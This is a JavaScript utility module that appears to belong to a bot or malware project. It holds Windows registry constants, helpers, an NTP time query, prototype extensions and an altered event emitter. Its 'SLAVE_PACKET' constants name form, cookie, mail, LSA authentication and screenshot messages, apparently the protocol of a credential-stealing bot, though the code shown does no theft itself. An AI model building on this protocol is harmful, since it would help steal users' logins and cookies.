var dgram = require('dgram');

exports.init = function (g)
{

    
    g.KEY_ALL_ACCESS = 0xF003F;
    g.HKEY_CLASSES_ROOT = 0x80000000;
    g.HKEY_CURRENT_USER = 0x80000001;
    g.HKEY_LOCAL_MACHINE = 0x80000002;
    g.HKEY_USERS = 0x80000003;
    g.HKEY_PERFORMANCE_DATA = 0x80000004;
    g.HKEY_CURRENT_CONFIG = 0x80000005;
    g.HKEY_DYN_DATA = 0x80000006;
    g.REG_OPTION_VOLATILE = 1;
    g.REG_OPTION_NON_VOLATILE = 0;
    g.REG_CREATED_NEW_KEY = 1;
    g.REG_OPENED_EXISTING_KEY = 2;
    g.REG_NONE = 0;
    g.REG_SZ = 1;
    g.REG_EXPAND_SZ = 2;
    g.REG_BINARY = 3;
    g.REG_DWORD_LITTLE_ENDIAN = 4;
    g.REG_DWORD = 4;
    g.REG_DWORD_BIG_ENDIAN = 5;
    g.REG_LINK = 6;
    g.REG_MULTI_SZ = 7;
    g.REG_RESOURCE_LIST = 8;
    g.REG_FULL_RESOURCE_DESCRIPTOR = 9;
    g.REG_RESOURCE_REQUIREMENTS_LIST = 10;
    g.REG_QWORD_LITTLE_ENDIAN = 11;
    g.REG_QWORD = 11;
    g.REG_NOTIFY_CHANGE_NAME = 1;
    g.REG_NOTIFY_CHANGE_ATTRIBUTES = 2;
    g.REG_NOTIFY_CHANGE_LAST_SET = 4;
    g.REG_NOTIFY_CHANGE_SECURITY = 8;

    g.KEY_QUERY_VALUE = 1;
    g.KEY_SET_VALUE = 2;
    g.KEY_CREATE_SUB_KEY = 4;
    g.KEY_ENUMERATE_SUB_KEYS = 8;
    g.KEY_NOTIFY = 16;
    g.KEY_CREATE_LINK = 32;
    g.KEY_WRITE = 0x20006;
    g.KEY_EXECUTE = 0x20019;
    g.KEY_READ = 0x20019;
    g.KEY_ALL_ACCESS = 0xf003f;

    g.SLAVE_PACKET_DEFAULTJS = 1000 + 0;
    g.SLAVE_PACKET_PRIVATEJS = 1000 + 1;
    g.SLAVE_PACKET_PROCESS_PROP = 1000 + 2;
    g.SLAVE_PACKET_SPCONFIG = 1000 + 3;
    g.SLAVE_PACKET_FORM = 1000 + 4;
    g.SLAVE_PACKET_URLNOTIFICATION = 1000 + 5;
    g.SLAVE_PACKET_UPDATE = 1000 + 6;
    g.SLAVE_PACKET_LSAAUTH = 1000 + 7;
    g.SLAVE_PACKET_LOGLINE = 1000 + 8;
    g.SLAVE_PACKET_MAIL = 1000 + 9;
    g.SLAVE_PACKET_COOKIE = 1000 + 10;

    g.SLAVE_PACKET_API_TAKESCREEN = 1100 + 9;

    g.STATUS_SUCCESS = 0x00;

    function getRandomArbitrary(min, max) {
        return Math.floor(Math.random() * (max - min) + min);
    }

    function getRandomInt() {
        return getRandomArbitrary(0, 0xffffffff);
    }

    function min(a, b) {
        return (((a) < (b)) ? (a) : (b));
    }

    function AlignUp(ADDR, ALMNT) {
        return ((((ADDR) + (ALMNT) - 1) / (ALMNT)) * (ALMNT));
    }

    function sleep(ms, cb) {
        setTimeout(function () { cb() }, ms);
    }

    g.sleep = sleep;
    g.min = min;
    g.AlignUp = AlignUp;
    g.getRandomArbitrary = getRandomArbitrary;
    g.getRandomInt = getRandomInt;

    process.network = {};
    process.network.ntp = {
        defaultNtpPort: 123,
        defaultNtpServer: "pool.ntp.org",
        ntpReplyTimeout : 10000
    }

    process.network.ntp.getNetworkTime = function (server, port, callback) {
        if (callback === null || typeof callback !== "function") {
            return;
        }

        server = server || process.network.ntp.defaultNtpServer;
        port = port || process.network.ntp.defaultNtpPort;

        var client = dgram.createSocket("udp4"),
            ntpData = new Buffer(48);

        // RFC 2030 -> LI = 0 (no warning, 2 bits), VN = 3 (IPv4 only, 3 bits), Mode = 3 (Client Mode, 3 bits) -> 1 byte
        // -> rtol(LI, 6) ^ rotl(VN, 3) ^ rotl(Mode, 0)
        // -> = 0x00 ^ 0x18 ^ 0x03
        ntpData[0] = 0x1B;

        for (var i = 1; i < 48; i++) {
            ntpData[i] = 0;
        }

        var timeout = setTimeout(function () {
            client.close();
            callback("Timeout waiting for NTP response.", null);
        }, process.network.ntp.ntpReplyTimeout);

        // Some errors can happen before/after send() or cause send() to was impossible.
        
        
        
        var errorFired = false;

        client.on('error', function (err) {
            if (errorFired) {
                return;
            }

            callback(err, null);
            errorFired = true;

            clearTimeout(timeout);
        });

        client.send(ntpData, 0, ntpData.length, port, server, function (err) {
            if (err) {
                if (errorFired) {
                    return;
                }
                clearTimeout(timeout);
                callback(err, null);
                errorFired = true;
                client.close();
                return;
            }

            client.once('message', function (msg) {
                clearTimeout(timeout);
                client.close();

                
                
                var offsetTransmitTime = 40,
                    intpart = 0,
                    fractpart = 0;

                
                for (var i = 0; i <= 3; i++) {
                    intpart = 256 * intpart + msg[offsetTransmitTime + i];
                }

                
                for (i = 4; i <= 7; i++) {
                    fractpart = 256 * fractpart + msg[offsetTransmitTime + i];
                }

                var milliseconds = (intpart * 1000 + (fractpart * 1000) / 0x100000000);

                // **UTC** time
                var date = new Date("Jan 01 1900 GMT");
                date.setUTCMilliseconds(date.getUTCMilliseconds() + milliseconds);

                callback(null, date);
            });
        });
    };


}

String.prototype.replaceAll = function (target, replacement) {
    return this.split(target).join(replacement);
};

String.prototype.cut = function (i0, i1) {
    return this.substring(0, i0) + this.substring(i1);
};

String.prototype.insertAt = function (index, string) {
    return this.substr(0, index) + string + this.substr(index);
};

String.prototype.hashCode = function () {
    var hash = 0;
    if (this.length == 0) return hash;
    for (let i = 0; i < this.length; i++) {
        let char = this.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32bit integer
    }
    return hash;
}

Array.prototype.randomElement = function () {
    return this[Math.floor(Math.random() * this.length)]
}

Array.prototype.remove = function () {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

Array.prototype.unique = function () {
    var a = this.concat();
    for (var i = 0; i < a.length; ++i) {
        for (var j = i + 1; j < a.length; ++j) {
            if (a[i] === a[j])
                a.splice(j--, 1);
        }
    }

    return a;
};


Array.prototype.findIndex = function (predicate) {
    var list = Object(this);
    var length = Math.max(0, list.length) >>> 0; // ES.ToUint32;
    if (length === 0) return -1;
    if (typeof predicate !== 'function' || Object.prototype.toString.call(predicate) !== '[object Function]') {
        throw new TypeError('Array#findIndex: predicate must be a function');
    }
    var thisArg = arguments.length > 1 ? arguments[1] : undefined;
    for (var i = 0; i < length; i++) {
        if (predicate.call(thisArg, list[i], i, list)) return i;
    }
    return -1;
};


var EventEmitter = require('events').EventEmitter;

EventEmitter.prototype.fall = function emit(type) {
    var er, handler, len, args, i, listeners, listener_index;

    if (!this._events)
        this._events = {};

    // If there is no 'error' event listener then throw.
    if (type === 'error' && !this._events.error) {
        er = arguments[1];
        if (this.domain) {
            if (!er)
                er = new Error('Uncaught, unspecified "error" event.');
            er.domainEmitter = this;
            er.domain = this.domain;
            er.domainThrown = false;
            this.domain.emit('error', er);
        } else if (er instanceof Error) {
            throw er; // Unhandled 'error' event
        } else {
            throw Error('Uncaught, unspecified "error" event.');
        }
        return false;
    }

    handler = this._events[type];

    if (util.isUndefined(handler))
        return false;

    if (this.domain && this !== process)
        this.domain.enter();

    if (util.isFunction(handler) && util.isFunction(arguments[arguments.length - 1])) {

        switch (arguments.length) {
            // fast cases
            case 1:
                handler.call(this, done);
                break;
            case 2:
                handler.call(this, arguments[1], arguments[arguments.length - 1]);
                break;
            case 3:
                handler.call(this, arguments[1], arguments[2], arguments[arguments.length - 1]);
                break;
                // slower
            default:
                len = arguments.length;
                args = new Array(len - 1);
                for (i = 1; i < len; i++)
                    args[i - 1] = arguments[i];

                handler.apply(this, args);
        }
    } else if (util.isObject(handler)) {
        len = arguments.length;
        args = new Array(len - 1);
        for (i = 1; i < len; i++)
            args[i - 1] = arguments[i];

        var donecb = args.pop();
        listeners = handler.slice();
        len = listeners.length;
        listener_index = 0;

        function call_next() {
            var len = arguments.length;
            var args = new Array(len);
            for (i = 0; i < len; i++)
                args[i] = arguments[i];

            var listener = listeners[listener_index++];
            if (util.isFunction(listener)) {
                args.push(call_next);
                listener.apply(this, args);
            } else {
                donecb.apply(this, args);
            }
        }
        call_next.apply(this, args);
    }

    if (this.domain && this !== process)
        this.domain.exit();

    return true;
};